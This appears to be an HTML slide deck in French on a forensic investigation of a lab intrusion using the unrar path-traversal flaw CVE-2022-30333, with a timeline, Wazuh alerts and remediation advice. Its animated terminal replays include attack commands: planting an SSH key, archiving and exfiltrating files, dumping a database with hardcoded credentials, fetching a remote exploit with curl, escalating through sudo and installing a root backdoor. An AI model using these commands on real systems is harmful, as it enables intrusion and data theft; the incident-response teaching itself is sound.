+      <div class="cve-card-head yellow">⚡ Mécanisme d'Exploitation</div>
+      <div class="cve-card-body">
+        <p style="margin-bottom:10px;color:var(--dim)">L'archive RAR malveillante contient une entrée avec un chemin relatif malformé :</p>
+        <div class="traversal-demo">
+          <div class="td-line"># Contenu de backup_data.rar :</div>
+          <div class="td-line">  wkkyblef         ← fichier leurre</div>
+          <div class="td-line bad">  ../../../../root/.ssh/authorized_keys</div>
+          <div class="td-line warn">#                 ^^^^^ PATH TRAVERSAL</div>
+          <div class="td-line">&nbsp;</div>
+          <div class="td-line"># unrar &lt; 6.1.7 ne valide pas le chemin</div>
+          <div class="td-line bad"># → écrit la clé SSH dans /root/.ssh/</div>
+          <div class="td-line bad"># → exécuté en root par webapp</div>
+          <div class="td-line">&nbsp;</div>
+          <div class="td-line ok"># unrar ≥ 6.1.7 : bloque la traversée</div>
+          <div class="td-line ok"># → "Security violation in path: ../"</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card 3: Version comparison -->
+    <div class="cve-card" id="cve-c3">
+      <div class="cve-card-head cyan">📋 Tableau des Versions</div>
+      <div class="cve-card-body">
+        <table class="ver-table">
+          <tr><th>Version unrar</th><th>Date</th><th>Statut</th><th>CVE-2022-30333</th></tr>
+          <tr class="vulnerable"><td>≤ 5.9.x</td><td>—</td><td>EOL</td><td>VULNÉRABLE</td></tr>
+          <tr class="vulnerable"><td>6.0.x</td><td>2021</td><td>Ancienne</td><td>VULNÉRABLE</td></tr>
+          <tr class="this-attack"><td>6.1.1 ← ici</td><td>2022-01</td><td>⚠ Non patché</td><td>VULNÉRABLE</td></tr>
+          <tr class="vulnerable"><td>6.1.2 – 6.1.6</td><td>2022</td><td>Intermédiaire</td><td>VULNÉRABLE</td></tr>
+          <tr class="patched"><td>6.1.7</td><td>2022-05-09</td><td>✓ PATCH</td><td>CORRIGÉ</td></tr>
+          <tr class="patched"><td>≥ 6.2.x</td><td>2023+</td><td>✓ Recommandé</td><td>CORRIGÉ</td></tr>
+        </table>
+        <br>
+        <p style="font-size:10px;color:var(--dim)">Le serveur ubuntu-target utilisait <span style="color:var(--red)">unrar 6.1.1</span> installé depuis les dépôts Ubuntu 22.04 non mis à jour. Le patch était disponible depuis <span style="color:var(--yellow)">6 mois</span> au moment de l'attaque.</p>
+      </div>
+    </div>
+
+    <!-- Card 4: Remediation -->
+    <div class="cve-card" id="cve-c4">
+      <div class="cve-card-head green">✅ Mesures Correctives</div>
+      <div class="cve-card-body">
+        <ul class="remediation-list">
+          <li><span class="rem-icon">🔧</span><span class="rem-text"><span class="hi">apt upgrade unrar</span> → mettre à jour vers ≥ 6.1.7 immédiatement</span></li>
+          <li><span class="rem-icon">🚫</span><span class="rem-text">Ne jamais exécuter le processus webapp en tant que <span class="hi">root</span> — utiliser un compte dédié sans privilèges</span></li>
+          <li><span class="rem-icon">🛡️</span><span class="rem-text">Activer les <span class="hi">mises à jour automatiques de sécurité</span> (unattended-upgrades)</span></li>
+          <li><span class="rem-icon">📁</span><span class="rem-text">Valider et <span class="hi">sanitiser les chemins</span> de toutes les archives avant extraction</span></li>
+          <li><span class="rem-icon">🔒</span><span class="rem-text">Corriger le fichier sudoers : supprimer <span class="hi">NOPASSWD:ALL</span></span></li>
+          <li><span class="rem-icon">🔑</span><span class="rem-text">Ne jamais stocker de <span class="hi">credentials en clair</span> dans le code source — utiliser des variables d'environnement</span></li>
+          <li><span class="rem-icon">🔍</span><span class="rem-text">Surveiller les accès à <span class="hi">/root/.ssh/authorized_keys</span> avec Wazuh FIM en temps réel</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- Lesson box full width -->
+    <div class="lesson-box" id="lesson-box">
+      <div class="lesson-icon">💡</div>
+      <div class="lesson-text">
+        <strong>LEÇON FONDAMENTALE</strong><br>
+        Une seule mise à jour manquante — <span style="color:var(--red)">unrar 6.1.1 → 6.1.7</span> — a permis à l'attaquant de déposer une clé SSH root sans aucune authentification, déclenchant une chaîne de compromission complète en moins de 2 heures. Le patch existait depuis <span style="color:var(--yellow)">6 mois</span>. La gestion des correctifs est une ligne de défense critique, non optionnelle.
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- NAV -->
+<div class="slide-nav" id="slide-nav"></div>
+<div class="nav-hint">← → or click dots</div>
+
+<script>
+// ══════════════════════════════════════════════
+//  SOUND ENGINE (Web Audio API)
+// ══════════════════════════════════════════════
+function playStartSound() {
+  const audio = new Audio('/home/elidrissi/Downloads/TD-LF/undertaker_entry.mp4');
+
+  audio.volume = 1.0; // 0.0 → 1.0
+  audio.currentTime = 0;
+
+  audio.play().catch(err => {
+    console.warn('Audio blocked until user interaction:', err);
+  });
+}
+// ══════════════════════════════════════════════
+//  MODE SWITCH
+// ══════════════════════════════════════════════
+function launchInvestigation() {
+  playStartSound();
+  const btn = document.getElementById('launch-btn');
+  btn.disabled = true;
+  btn.style.opacity = '0.6';
+  // Flash bright white
+  document.getElementById('title-bright').style.filter = 'brightness(2)';
+  setTimeout(() => {
+    document.getElementById('title-bright').style.transition = 'opacity 0.9s ease, filter 0.3s';
+    document.getElementById('title-bright').style.filter = 'brightness(1)';
+    document.getElementById('title-bright').style.opacity = '0';
+    document.getElementById('title-bright').style.pointerEvents = 'none';
+    document.getElementById('slide-0').style.background = 'var(--bg)';
+    document.getElementById('title-dark').classList.add('show');
+  }, 300);
+}
+
+// ══════════════════════════════════════════════
+//  TERMINAL DATA
+// ══════════════════════════════════════════════
+const TERMS = {
+  2: [
+    { p: 'attacker@arch', r: false, cmd: '# CVE-2022-30333 — Zip Slip exploit' },
+    { out: '# Forge RAR avec path traversal', cls: 't-output' },
+    { p: 'attacker@arch', r: false, cmd: 'python3 exploit_cve30333.py --target http://target.azure.com/upload --key ~/.ssh/id_rsa.pub' },
+    { out: '[*] Forging malicious RAR archive: backup_data.rar', cls: 't-output' },
+    { out: '[*] Payload path: ../../../../root/.ssh/authorized_keys', cls: 't-output-warn' },
+    { out: '[*] Logging in as stof...', cls: 't-output' },
+    { out: '[+] POST /login → 302 OK', cls: 't-output-success' },
+    { out: '[+] GET /upload → 200 OK', cls: 't-output-success' },
+    { out: '[*] Uploading backup_data.rar...', cls: 't-output' },
+    { out: '[+] UPLOAD success — unrar triggered as root!', cls: 't-output-success' },
+    { out: '[+] SSH key written to /root/.ssh/authorized_keys', cls: 't-output-success' },
+    { out: '[*] Testing SSH access...', cls: 't-output' },
+    { p: 'attacker@arch', r: false, cmd: 'ssh root@target.azure.com' },
+    { out: 'The authenticity of host cannot be established.', cls: 't-output-warn' },
+    { out: 'Are you sure you want to continue connecting? yes', cls: 't-output' },
+    { out: 'Warning: Permanently added to known hosts.', cls: 't-output' },
+    { out: 'root@ubuntu-target:~# ', cls: 't-output-success' },
+  ],
+  3: [
+    { p: 'stt@ubuntu-target', r: false, cmd: '# Session SSH établie via clé injectée' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'id' },
+    { out: 'uid=1000(stt) gid=1000(stt) groups=1000(stt),27(sudo)', cls: 't-output-hi' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'ls -la' },
+    { out: 'total 28', cls: 't-output' },
+    { out: 'drwxr-xr-x 5 stt  stt  4096 May  8 21:37 .', cls: 't-output' },
+    { out: 'drwxr-xr-x 4 root root 4096 May  8 20:10 ..', cls: 't-output' },
+    { out: 'drwxr-xr-x 8 stt  stt  4096 May  8 21:33 vuln-lab', cls: 't-output-hi' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'ls -la vuln-lab/' },
+    { out: 'app.py  requirements.txt  templates/  uploads/  db/', cls: 't-output-hi' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'grep -r "password" vuln-lab/ --include="*.py"' },
+    { out: "vuln-lab/app.py:    password='password123',", cls: 't-output-warn' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'snap list' },
+    { out: 'Name    Version  Rev  Tracking  Publisher  Notes', cls: 't-output' },
+    { out: 'core20  20230622 1974 latest/stable canonical  base', cls: 't-output' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'ls -la  # inventaire final' },
+    { out: 'drwxr-xr-x 5 stt stt 4096 May 8 21:45 .', cls: 't-output' },
+  ],
+  4: [
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'tar -czf /home/stt/everything.tar.gz -C /home/stt . --exclude=everything.tar.gz' },
+    { out: '[archivage en cours...]', cls: 't-output' },
+    { out: 'Archive created: everything.tar.gz (4.2MB)', cls: 't-output-success' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'ls -lh everything.tar.gz' },
+    { out: '-rw-rw-r-- 1 stt stt 4.2M May 8 21:45 everything.tar.gz', cls: 't-output-hi' },
+    { out: '', cls: 't-output' },
+    { out: '# Ouvrir second terminal — session SFTP', cls: 't-output' },
+    { p: 'attacker@arch', r: false, cmd: 'sftp stt@target.azure.com' },
+    { out: 'Connected to target.azure.com.', cls: 't-output-success' },
+    { out: 'sftp> get everything.tar.gz', cls: 't-output-hi' },
+    { out: 'Fetching /home/stt/everything.tar.gz to everything.tar.gz', cls: 't-output' },
+    { out: 'everything.tar.gz     100% 4309KB   2.3MB/s   00:01', cls: 't-output-success' },
+    { out: 'sftp> exit', cls: 't-output' },
+    { out: '[Session fermée — archive récupérée]', cls: 't-output-warn' },
+  ],
+  5: [
+    { p: 'stt@ubuntu-target:~/vuln-lab$', r: false, cmd: 'cat app.py' },
+    { out: '# Database connection', cls: 't-output' },
+    { out: 'def get_db_connection():', cls: 't-output' },
+    { out: '    connection = mysql.connector.connect(', cls: 't-output' },
+    { out: "        host='localhost',", cls: 't-output-cred' },
+    { out: "        user='root',", cls: 't-output-cred' },
+    { out: "        password='password123',   # ← HARDCODED!", cls: 't-output-cred' },
+    { out: "        database='zipvault'", cls: 't-output-cred' },
+    { out: '    )', cls: 't-output' },
+    { p: 'stt@ubuntu-target:~/vuln-lab$', r: false, cmd: 'mysqldump -u "root" -ppassword123 "zipvault" > dump.sql' },
+    { out: 'mysqldump: [Warning] Using a password on the command line interface can be insecure.', cls: 't-output-warn' },
+    { out: '-- MySQL dump 10.13  Distrib 8.0.36', cls: 't-output' },
+    { out: '-- Dump completed on 2026-05-08 21:50:34', cls: 't-output-success' },
+    { p: 'stt@ubuntu-target:~/vuln-lab$', r: false, cmd: 'cat dump.sql | head -20' },
+    { out: '-- Table structure for table `users`', cls: 't-output-hi' },
+    { out: '-- Table structure for table `files`', cls: 't-output-hi' },
+    { out: '[Base de données complète exfiltrée]', cls: 't-output-success' },
+  ],
+  6: [
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'curl https://copy.fail/exp -o /tmp/exp.sh' },
+    { out: 'curl: (6) Could not resolve host: copy.fail', cls: 't-output-error' },
+    { out: '# Exploit download failed — Azure NSG blocks outbound', cls: 't-output-warn' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'su root' },
+    { out: 'Password:', cls: 't-output' },
+    { out: 'su: Authentication failure', cls: 't-output-error' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'uname -r' },
+    { out: '5.15.0-1045-azure', cls: 't-output-hi' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'find / -perm -u=s -type f 2>/dev/null' },
+    { out: '/usr/bin/sudo', cls: 't-output' },
+    { out: '/usr/bin/su', cls: 't-output' },
+    { out: '/usr/bin/passwd', cls: 't-output' },
+    { out: '/usr/bin/mount', cls: 't-output' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'sudo -l' },
+    { out: 'Matching Defaults entries for stt on OSsec:', cls: 't-output' },
+    { out: '    env_reset, mail_badpass', cls: 't-output' },
+    { out: 'User stt may run the following commands on OSsec:', cls: 't-output-warn' },
+    { out: '    (ALL : ALL) ALL', cls: 't-output-warn' },
+    { out: '    (ALL) NOPASSWD: ALL    ← MISCONFIGURATION!', cls: 't-output-cred' },
+    { p: 'stt@ubuntu-target:~$', r: false, cmd: 'sudo -i' },
+    { p: 'root@ubuntu-target:~#', r: true, cmd: 'id' },
+    { out: 'uid=0(root) gid=0(root) groups=0(root)', cls: 't-output-success' },
+    { out: '# ROOT ACCESS ACHIEVED!', cls: 't-output-success' },
+  ],
+  7: [
+    { p: 'root@ubuntu-target:~#', r: true, cmd: 'passwd' },
+    { out: 'New password:', cls: 't-output' },
+    { out: 'Retype new password:', cls: 't-output' },
+    { out: 'passwd: password updated successfully', cls: 't-output-success' },
+    { out: '# Mot de passe root modifié — accès légitime bloqué', cls: 't-output-warn' },
+    { p: 'root@ubuntu-target:~#', r: true, cmd: 'mkdir -p /root/.ssh' },
+    { p: 'root@ubuntu-target:~#', r: true, cmd: 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAA...attacker_key" >> /root/.ssh/authorized_keys' },
+    { out: '# Wazuh FIM détecte la modification!', cls: 't-output-warn' },
+    { out: '# Rule 550 triggered: Integrity checksum changed', cls: 't-output-warn' },
+    { out: '# authorized_keys: 261 → 356 bytes', cls: 't-output-warn' },
+    { p: 'root@ubuntu-target:~#', r: true, cmd: 'chmod 600 /root/.ssh/authorized_keys' },
+    { p: 'root@ubuntu-target:~#', r: true, cmd: 'systemctl restart ssh' },
+    { out: '', cls: 't-output' },
+    { out: '# BACKDOOR OPÉRATIONNELLE', cls: 't-output-success' },
+    { out: '# Connexion root sans mot de passe possible', cls: 't-output-success' },
+    { out: '# Survivra à tout changement de mot de passe', cls: 't-output-success' },
+    { p: 'attacker@arch', r: false, cmd: 'ssh root@target.azure.com  # test backdoor' },
+    { out: 'Welcome to Ubuntu 22.04.3 LTS', cls: 't-output-hi' },
+    { p: 'root@ubuntu-target:~#', r: true, cmd: '' },
+  ],
+};
+
+// ══════════════════════════════════════════════
+//  TIMELINE DATA
+// ══════════════════════════════════════════════
+const TL_DATA = [
+  { time:'20:36:53', phase:'phase-init', phaseLabel:'ACCÈS INITIAL', event:'Authentification SaaS', detail:'POST /login + GET /upload — 105.68.208.123' },
+  { time:'20:37:11', phase:'phase-init', phaseLabel:'ACCÈS INITIAL', event:'Upload backup_data.rar', detail:'CVE-2022-30333 — unrar -o+ exécuté en root' },
+  { time:'21:37:13', phase:'phase-init', phaseLabel:'ACCÈS INITIAL', event:'Dépôt clé SSH via Path Traversal', detail:'authorized_keys écrit en root' },
+  { time:'21:38:05', phase:'phase-persist', phaseLabel:'PERSISTANCE', event:'Connexion SSH réussie (Session 1)', detail:'Wazuh rule 5715 — même IP attaquante' },
+  { time:'21:38:09', phase:'phase-recon', phaseLabel:'RECONNAISSANCE', event:'Énumération ls, id, grep', detail:'Exploration /home/stt et /home/stt/vuln-lab — ses=244' },
+  { time:'21:45:55', phase:'phase-exfil', phaseLabel:'EXFILTRATION', event:'tar -czf everything.tar.gz', detail:'Archivage complet de /home/stt' },
+  { time:'21:46:45', phase:'phase-exfil', phaseLabel:'EXFILTRATION', event:'Session SFTP — transfert archive', detail:'Wazuh: sftp-server lancé, session fermée immédiatement' },
+  { time:'21:48:21', phase:'phase-exfil', phaseLabel:'EXFILTRATION', event:'cat/vim app.py — vol credentials', detail:'MySQL root/password123/zipvault exposés en clair' },
+  { time:'21:50:33', phase:'phase-exfil', phaseLabel:'EXFILTRATION', event:'mysqldump -u root -ppassword123 zipvault', detail:'Base de données complète exfiltrée' },
+  { time:'21:53:32', phase:'phase-privesc', phaseLabel:'PRIV ESC', event:'curl exploit (échec Azure NSG)', detail:'copy.fail bloqué — pivot vers autre méthode' },
+  { time:'21:56:50', phase:'phase-privesc', phaseLabel:'PRIV ESC', event:'su root — échec PAM (5503/5301)', detail:'Mot de passe root inconnu à ce stade' },
+  { time:'22:03:58', phase:'phase-privesc', phaseLabel:'PRIV ESC', event:'find / -perm -u=s — SUID enum', detail:'sudo, su, passwd détectés' },
+  { time:'22:07:08', phase:'phase-privesc', phaseLabel:'PRIV ESC', event:'sudo -i → ROOT obtenu', detail:'Wazuh 5402 — NOPASSWD:ALL mal configuré' },
+  { time:'22:11:39', phase:'phase-backdoor', phaseLabel:'BACKDOOR', event:'passwd root modifié', detail:'Wazuh 5555 — administrateurs légitimes bloqués' },
+  { time:'22:16:25', phase:'phase-backdoor', phaseLabel:'BACKDOOR', event:'mkdir /root/.ssh + injection clé', detail:'Wazuh FIM 550 — checksum changed' },
+  { time:'22:17:31', phase:'phase-backdoor', phaseLabel:'BACKDOOR', event:'systemctl restart ssh — backdoor active', detail:'Accès root permanent sans mot de passe' },
+];
+
+// ══════════════════════════════════════════════
+//  SLIDE MANAGER
+// ══════════════════════════════════════════════
+const TOTAL = 11;
+let current = 0;
+let animDone = new Set();
+
+function buildNav() {
+  const nav = document.getElementById('slide-nav');
+  for (let i = 0; i < TOTAL; i++) {
+    const d = document.createElement('div');
+    d.className = 'dot' + (i === 0 ? ' active' : '');
+    d.onclick = () => goTo(i);
+    nav.appendChild(d);
+  }
+}
+
+function goTo(n) {
+  const all = Array.from({length: TOTAL}, (_, i) => document.getElementById(`slide-${i}`));
+  all.forEach(s => { if (!s) return; s.style.display='none'; s.classList.remove('active','visible'); });
+  document.querySelectorAll('.dot').forEach((d,i) => d.classList.toggle('active', i===n));
+  current = n;
+  const sl = document.getElementById(`slide-${n}`);
+  if (!sl) return;
+  sl.style.display = 'flex';
+  sl.classList.add('active');
+  requestAnimationFrame(() => {
+    sl.classList.add('visible');
+    if (!animDone.has(n)) { animDone.add(n); setTimeout(() => runAnim(n), 200); }
+  });
+}
+
+document.addEventListener('keydown', e => {
+  if (e.key === 'ArrowRight' || e.key === ' ') goTo(Math.min(current+1, TOTAL-1));
+  if (e.key === 'ArrowLeft') goTo(Math.max(current-1, 0));
+});
+
+// ══════════════════════════════════════════════
+//  ANIMATIONS PER SLIDE
+// ══════════════════════════════════════════════
+function runAnim(n) {
+  if (n === 0) { /* title: handled by launchInvestigation() */ }
+  else if (n === 1) animPremierIndice();
+  else if (n >= 2 && n <= 7) animSplit(n);
+  else if (n === 8) animTimeline();
+  else if (n === 9) animIOC();
+  else if (n === 10) animCVE();
+}
+
+function animPremierIndice() {
+  const cards = ['qc1','qc2','qc3','fc1','fc2','fc3'];
+  cards.forEach((id, i) => {
+    setTimeout(() => {
+      const el = document.getElementById(id);
+      if (el) el.classList.add('shown');
+    }, 300 + i * 350);
+  });
+}
+
+function animSplit(n) {
+  const logContainer = document.getElementById(`logs-${n}`);
+  if (logContainer) {
+    const entries = logContainer.querySelectorAll('.log-entry');
+    entries.forEach((e, i) => setTimeout(() => e.classList.add('shown'), i * 120));
+  }
+  const termContainer = document.getElementById(`term-${n}`);
+  if (termContainer && TERMS[n]) typeTerminal(termContainer, TERMS[n]);
+}
+
+function typeTerminal(container, lines) {
+  let delay = 200;
+  lines.forEach(line => {
+    if (line.p !== undefined) {
+      const isRoot = line.r;
+      const wrapper = document.createElement('div');
+      const promptSpan = document.createElement('span');
+      promptSpan.className = isRoot ? 't-prompt-root' : 't-prompt';
+      promptSpan.textContent = line.p + ' ';
+      const cmdSpan = document.createElement('span');
+      cmdSpan.className = 't-cmd';
+      wrapper.appendChild(promptSpan);
+      wrapper.appendChild(cmdSpan);
+      setTimeout(() => {
+        container.appendChild(wrapper);
+        container.scrollTop = container.scrollHeight;
+        typeText(cmdSpan, line.cmd, 45);
+      }, delay);
+      delay += 300 + line.cmd.length * 50;
+    } else {
+      const div = document.createElement('div');
+      div.className = line.cls || 't-output';
+      div.textContent = line.out;
+      div.style.opacity = '0';
+      setTimeout(() => {
+        container.appendChild(div);
+        div.style.transition = 'opacity 0.2s';
+        div.style.opacity = '1';
+        container.scrollTop = container.scrollHeight;
+      }, delay);
+      delay += 80;
+    }
+  });
+  setTimeout(() => {
+    const last = lines[lines.length-1];
+    const cur = document.createElement('span');
+    cur.className = 'cursor' + (last && last.r ? ' cursor-root' : '');
+    container.appendChild(cur);
+    container.scrollTop = container.scrollHeight;
+  }, delay + 100);
+}
+
+function typeText(el, text, speed) {
+  let i = 0;
+  const iv = setInterval(() => {
+    if (i < text.length) { el.textContent += text[i]; i++; }
+    else clearInterval(iv);
+  }, speed);
+}
+
+function animTimeline() {
+  const grid = document.getElementById('tl-grid');
+  grid.innerHTML = '';
+  TL_DATA.forEach((item, i) => {
+    const t = document.createElement('div');
+    t.className = 'tl-time'; t.textContent = item.time;
+    const lc = document.createElement('div');
+    lc.className = 'tl-line-container';
+    const dot = document.createElement('div');
+    dot.className = `tl-dot ${item.phase}`;
+    dot.style.color = dot.style.background = getDotColor(item.phase);
+    const vline = document.createElement('div');
+    vline.className = 'tl-vline';
+    lc.appendChild(dot);
+    if (i < TL_DATA.length-1) lc.appendChild(vline);
+    const c = document.createElement('div');
+    c.className = 'tl-content';
+    c.innerHTML = `<div class="tl-phase ${item.phase}">${item.phaseLabel}</div>
+                   <div class="tl-event">${item.event}</div>
+                   <div class="tl-detail">${item.detail}</div>`;
+    grid.appendChild(t); grid.appendChild(lc); grid.appendChild(c);
+    setTimeout(() => c.classList.add('shown'), 100 + i*100);
+  });
+}
+
+function getDotColor(phase) {
+  return { 'phase-init':'var(--cyan)', 'phase-persist':'var(--green)', 'phase-recon':'var(--yellow)', 'phase-exfil':'var(--orange)', 'phase-privesc':'var(--red)', 'phase-backdoor':'#ff00ff' }[phase] || 'var(--dim)';
+}
+
+function animIOC() {
+  document.querySelectorAll('.ioc-card').forEach((c, i) => setTimeout(() => c.classList.add('shown'), i*120));
+}
+
+function animCVE() {
+  ['cve-c1','cve-c2','cve-c3','cve-c4'].forEach((id, i) => {
+    setTimeout(() => {
+      const el = document.getElementById(id);
+      if (el) el.classList.add('shown');
+    }, 150 + i*200);
+  });
+  setTimeout(() => {
+    const lb = document.getElementById('lesson-box');
+    if (lb) lb.classList.add('shown');
+    // animate CVSS bars
+    setTimeout(() => {
+      const b1 = document.getElementById('bar1'); if(b1) b1.style.width='75%';
+      const b2 = document.getElementById('bar2'); if(b2) b2.style.width='100%';
+      const b3 = document.getElementById('bar3'); if(b3) b3.style.width='75%';
+    }, 200);
+  }, 900);
+}
+
+// ══════════════════════════════════════════════
+//  INIT
+// ══════════════════════════════════════════════
+buildNav();
+goTo(0);
+</script>
+</body>
+</html>
